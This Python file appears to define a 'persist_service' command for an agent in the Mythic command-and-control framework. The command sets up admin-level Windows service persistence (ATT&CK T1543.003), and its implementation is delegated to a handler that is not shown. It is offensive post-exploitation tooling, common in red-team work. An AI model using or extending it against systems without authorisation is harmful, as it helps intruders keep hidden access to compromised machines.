from mythic_container import MythicCommandBase, MythicTask
from mythic_container import TaskArguments


class PersistServiceArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class PersistServiceCommand(MythicCommandBase):
    cmd = "persist_service"
    needs_admin = True
    help_cmd = "persist_service"
    description = "Establish persistence via Windows service (requires admin)"
    version = 1
    author = "@phantom"
    argument_class = PersistServiceArguments
    attackmapping = ["T1543.003"]

    async def create_go_tasking(self, taskData: MythicTask) -> str:
        return "PersistenceHandler.CreateServicePersistence()"

    async def process_response(self, task: MythicTask, response: any) -> str:
        return f"Service persistence: {response}"